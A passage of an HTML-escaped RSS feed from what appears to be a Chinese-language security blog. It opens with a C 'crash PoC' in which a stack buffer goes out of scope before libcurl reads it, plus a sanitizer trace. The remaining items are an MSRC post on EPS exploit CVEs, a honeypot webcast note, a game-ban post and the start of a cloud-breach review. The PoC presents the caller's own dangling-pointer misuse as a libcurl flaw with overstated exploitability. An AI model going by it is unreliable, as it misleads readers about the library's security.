&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// http3_crash_poc.c
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;curl/curl.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;CURL&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;curl_easy_init&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// 栈分配缓冲区将在作用域外失效
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;body_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;257&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;memset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;body_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;body_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;256&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;\0&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CURLOPT_URL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;https://example.com/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CURLOPT_HTTP_VERSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CURL_HTTP_VERSION_3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CURLOPT_POST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1L&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nf&#34;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CURLOPT_POSTFIELDS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;body_data&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 漏洞调用
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nf&#34;&gt;curl_easy_setopt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CURLOPT_TIMEOUT_MS&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;50L&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// body_data在此处超出作用域
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// libcurl在传输期间访问无效内存
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;nf&#34;&gt;curl_easy_perform&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nf&#34;&gt;curl_easy_cleanup&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;curl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;编译并运行:&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;clang -fsanitize&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;address http3_crash_poc.c -lcurl -o poc
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./poc
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;崩溃输出&#34;&gt;崩溃输出
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;==3720==ERROR: AddressSanitizer: stack-use-after-scope on address 0x00016fa21470
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;READ of size 45 at 0x00016fa21470 thread T0
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    #0 strlen
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    #1 Curl_pretransfer transfer.c:569
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    #2 multi_runsingle multi.c:2376
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    #3 curl_multi_perform multi.c:2756
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    #4 easy_transfer easy.c:705
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    #5 easy_perform easy.c:813
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SUMMARY: AddressSanitizer: stack-use-after-scope transfer.c:569 in Curl_pretransfer
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;技术分析&#34;&gt;技术分析
&lt;/h2&gt;&lt;h3 id=&#34;根本原因&#34;&gt;根本原因
&lt;/h3&gt;&lt;p&gt;漏洞源于libcurl的CURLOPT_POSTFIELDS行为：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;libcurl存储指针但不复制数据&lt;/li&gt;
&lt;li&gt;应用程序的栈缓冲区在作用域退出后失效&lt;/li&gt;
&lt;li&gt;libcurl稍后在Curl_pretransfer()中解引用无效指针&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;受影响代码路径&#34;&gt;受影响代码路径
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl_easy_setopt(CURLOPT_POSTFIELDS) →
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl_easy_perform() →
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Curl_pretransfer() →
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;strlen(invalid_pointer) →
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;CRASH
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;文档: 明确说明CURLOPT_POSTFIELDS数据在传输完成前必须保持有效&lt;/li&gt;
&lt;li&gt;API增强: 考虑添加边界检查或对栈检测指针自动复制&lt;/li&gt;
&lt;li&gt;替代API: 推广更安全使用模式的CURLOPT_COPYPOSTFIELDS&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;影响&#34;&gt;影响
&lt;/h2&gt;&lt;h3 id=&#34;安全影响&#34;&gt;安全影响
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;拒绝服务: 必然导致应用终止的崩溃&lt;/li&gt;
&lt;li&gt;内存损坏: 释放后使用可能导致不可预测行为&lt;/li&gt;
&lt;li&gt;潜在代码执行: 特定情况下内存损坏可能被用于控制流劫持&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;受影响场景&#34;&gt;受影响场景
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;使用libcurl进行HTTP/3 POST请求的应用程序&lt;/li&gt;
&lt;li&gt;任何CURLOPT_POSTFIELDS指向栈分配内存的代码模式&lt;/li&gt;
&lt;li&gt;特别影响:
&lt;ul&gt;
&lt;li&gt;HTTP/3客户端应用&lt;/li&gt;
&lt;li&gt;使用栈缓冲区作为请求体的API客户端&lt;/li&gt;
&lt;li&gt;堆使用受限的嵌入式系统&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;实际暴露&#34;&gt;实际暴露
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;语言绑定: 许多curl绑定可能无意中创建此模式&lt;/li&gt;
&lt;li&gt;示例应用: CLI工具、网络爬虫、API客户端&lt;/li&gt;
&lt;li&gt;严重性: 由于HTTP/3采用率增长和远程可利用性而较高&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>协同应对Encapsulated PostScript (EPS)攻击 | MSRC博客</title>
        <link>http://localhost:1313/p/%E5%8D%8F%E5%90%8C%E5%BA%94%E5%AF%B9encapsulated-postscript-eps%E6%94%BB%E5%87%BB-msrc%E5%8D%9A%E5%AE%A2/</link>
        <pubDate>Mon, 04 Aug 2025 00:04:37 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%8D%8F%E5%90%8C%E5%BA%94%E5%AF%B9encapsulated-postscript-eps%E6%94%BB%E5%87%BB-msrc%E5%8D%9A%E5%AE%A2/</guid>
        <description>&lt;p&gt;今天的安全更新包含三个典型案例，展示了安全生态系统如何协同保护消费者和企业。我们感谢FireEye和ESET的合作。已安装最新安全更新的用户可免受下述攻击。&lt;/p&gt;
&lt;p&gt;通过微软主动保护计划(MAPP)，合作伙伴向我们预警了高度相关的定向攻击。这些攻击均使用畸形Word文档，通过精准钓鱼邮件针对特定人群。攻击组合利用了Office Encapsulated PostScript (EPS)过滤器的远程代码执行漏洞和Windows权限提升漏洞来突破Office沙箱保护。EPS是当前生态中已较少使用的遗留格式，因此我们在2017年4月通过深度防御保护默认关闭了该代码路径。安装上月Office累积更新的用户已获得防护。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Word EPS + Windows权限提升组合攻击 (CVE-2017-0261 + CVE-2017-0001)&lt;/strong&gt;&lt;br&gt;
3月下旬接报此攻击，但用户已受3月更新保护。本次更新彻底修复EPS漏洞，并为少数仍需使用EPS过滤器的用户提供额外保护。目前仅观察到有限的攻击尝试，该攻击方式现已失效。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Word EPS + Windows权限提升组合攻击 (CVE-2017-0262 + CVE-2017-0263)&lt;/strong&gt;&lt;br&gt;
微软4月中旬检测到该攻击，但用户已受4月深度防御更新保护（默认关闭EPS过滤器）。本次更新进一步修复底层过滤器漏洞和权限提升漏洞。攻击尝试同样有限且已失效。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这些更新凸显了保持系统更新对防御新型恶意软件的重要性。企业用户可参考每月发布的漏洞可利用指数来优先评估更新。使用微软主动保护计划合作伙伴的最新反恶意软件也能有效防护。&lt;/p&gt;
&lt;p&gt;我们长期支持协调漏洞披露机制，欢迎研究人员通过secure@microsoft.com报告漏洞。微软安全响应中心(MSRC)接到报告后会立即启动全面调查，经过详尽测试后发布跨版本更新，在及时性与质量间取得平衡。&lt;/p&gt;
&lt;p&gt;更多安全更新信息详见&lt;a class=&#34;link&#34; href=&#34;https://www.microsoft.com/security-updates&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;安全更新指南&lt;/a&gt;。企业用户可&lt;a class=&#34;link&#34; href=&#34;https://office365-updates&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;此处&lt;/a&gt;检查Office 365更新状态。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;相关链接&lt;/strong&gt;：&lt;br&gt;
CVE-2017-0261、CVE-2017-0262和CVE-2017-0263漏洞详情&lt;/p&gt;
</description>
        </item>
        <item>
        <title>实战演练：使用John Strand讲解Active Directory主动防御(Active DAD)入门</title>
        <link>http://localhost:1313/p/%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83%E4%BD%BF%E7%94%A8john-strand%E8%AE%B2%E8%A7%A3active-directory%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1active-dad%E5%85%A5%E9%97%A8/</link>
        <pubDate>Sun, 03 Aug 2025 23:48:09 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83%E4%BD%BF%E7%94%A8john-strand%E8%AE%B2%E8%A7%A3active-directory%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1active-dad%E5%85%A5%E9%97%A8/</guid>
        <description>&lt;h1 id=&#34;webcast-active-domain-active-defense-active-dad-primer-with-john-strand&#34;&gt;WEBCAST: Active Domain Active Defense (Active DAD) Primer with John Strand
&lt;/h1&gt;&lt;p&gt;这是我们在华盛顿特区现场活动的演播室版本。在本视频中，John将讲解如何使用Active Defense Harbinger Distribution(ADHD)中的工具设置Active Directory主动防御(ADAD)。他将演示如何：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;创建蜜罐账户(honey accounts)&lt;/li&gt;
&lt;li&gt;制作回调Word文档(callback word documents)&lt;/li&gt;
&lt;li&gt;搭建虚假SMB共享(fake SMB shares)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;幻灯片下载地址：&lt;a class=&#34;link&#34; href=&#34;https://www.dropbox.com/s/kyfugi66j56ek8v/HoneyAdmin_AndShare.pptx?dl=0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://www.dropbox.com/s/kyfugi66j56ek8v/HoneyAdmin_AndShare.pptx?dl=0&lt;/a&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>因安全研究遭封禁：游戏逆向工程与反作弊系统的冲突</title>
        <link>http://localhost:1313/p/%E5%9B%A0%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E9%81%AD%E5%B0%81%E7%A6%81%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E4%B8%8E%E5%8F%8D%E4%BD%9C%E5%BC%8A%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%B2%E7%AA%81/</link>
        <pubDate>Sun, 03 Aug 2025 23:26:36 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%9B%A0%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6%E9%81%AD%E5%B0%81%E7%A6%81%E6%B8%B8%E6%88%8F%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E4%B8%8E%E5%8F%8D%E4%BD%9C%E5%BC%8A%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%86%B2%E7%AA%81/</guid>
        <description>&lt;h1 id=&#34;因安全研究遭封禁&#34;&gt;因安全研究遭封禁
&lt;/h1&gt;&lt;p&gt;2020年11月25日&lt;br&gt;
&lt;em&gt;本文观点仅代表个人立场，与雇主及同事无关，所有研究均在个人时间完成&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;一周前，动视公司因我尝试研究《使命召唤：现代战争/战区》(2019)的网络通信代码安全性而封禁了我的账号。作为用户，我认为当自身可能面临风险时，应当有权进行漏洞研究。多人在线游戏涉及大量网络通信，包括用户与厂商之间（如获取统计数据或用户配置）以及用户之间（创建私人房间或语音聊天）的交互。玩家理应相信正常游戏不会导致安全威胁。&lt;/p&gt;
&lt;p&gt;初步调研显示，已有安全研究人员通过逆向工程发现并报告了该游戏前代版本的漏洞[1,2,3,4]，这既证明了安全风险的客观存在，也表明动视曾接受漏洞报告的先例。&lt;/p&gt;
&lt;h2 id=&#34;技术研究过程&#34;&gt;技术研究过程
&lt;/h2&gt;&lt;p&gt;为开展研究，我需要逆向分析游戏可执行文件中的网络通信代码以审查内存破坏漏洞。但由于程序被严重混淆，IDA无法正常分析，我不得不从运行中的游戏进程内存转储未混淆的代码——这可能是开发者将我标记为疑似作弊者的关键节点。&lt;/p&gt;
&lt;p&gt;为避免影响其他玩家，我在游戏主菜单界面尝试了两种内存读取方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先附加WinDbg调试器，游戏立即退出（可能触发封禁）&lt;/li&gt;
&lt;li&gt;随后尝试暂停进程进行内存转储，仅获取主菜单状态的内存镜像后正常退出&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;经过数日分析，我因二进制文件体积庞大且结构复杂决定暂缓项目。但一个月后账号仍遭封禁，导致疫情期间通过游戏与亲友建立的联系及一年多的游戏进度全部丢失。&lt;/p&gt;
&lt;h2 id=&#34;行业对比与反思&#34;&gt;行业对比与反思
&lt;/h2&gt;&lt;p&gt;此前我在CTF比赛中对《CS:GO》进行逆向工程和模糊测试时从未面临封禁风险。Valve不仅常规接收漏洞报告，还曾向研究者支付18,000美元漏洞奖金。游戏作弊确实是破坏玩家体验的首要威胁，开发者需要综合多种信号检测作弊行为。但动视可能因缺乏安全研究先例，将任何逆向工程尝试都视为恶意行为——普通玩家确实不会附加调试器，因此开发者可能认为无需更多证据即可封禁。&lt;/p&gt;
&lt;p&gt;需要明确的是：我从未试图开发或使用作弊工具，也从未为自身或他人篡改游戏数据。至今我仍不清楚具体触发封禁的原因，且没有申诉渠道。更令人担忧的是，这种机制可能导致日常工作需要使用逆向工具的安全人员被误判。&lt;/p&gt;
&lt;h2 id=&#34;建议与展望&#34;&gt;建议与展望
&lt;/h2&gt;&lt;p&gt;希望动视能解封我的账号，更重要的是建立安全研究豁免机制：包括明确安全研究的合法边界、设置漏洞报告联系渠道（甚至漏洞赏金计划）。随着PC平台反作弊工作的难度和争议性日益增加，动视应当效仿Valve等厂商，与安全研究者建立共生而非对立的关系。通过协作，我们才能共同抵御作弊者和恶意用户的威胁。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2021年云安全漏洞与数据泄露回顾：从凭证泄露到S3配置错误</title>
        <link>http://localhost:1313/p/2021%E5%B9%B4%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E5%9B%9E%E9%A1%BE%E4%BB%8E%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E5%88%B0s3%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/</link>
        <pubDate>Sun, 03 Aug 2025 23:09:59 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2021%E5%B9%B4%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E5%9B%9E%E9%A1%BE%E4%BB%8E%E5%87%AD%E8%AF%81%E6%B3%84%E9%9C%B2%E5%88%B0s3%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/</guid>
        <description>&lt;h1 id=&#34;2021年云安全漏洞与数据泄露回顾&#34;&gt;2021年云安全漏洞与数据泄露回顾
&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
&lt;/h2&gt;&lt;p&gt;云安全事件的实际数据往往缺乏细节，且存在幸存者偏差。本文聚焦2021年公开披露的云安全事件，不包括云服务提供商自身的漏洞。&lt;/p&gt;
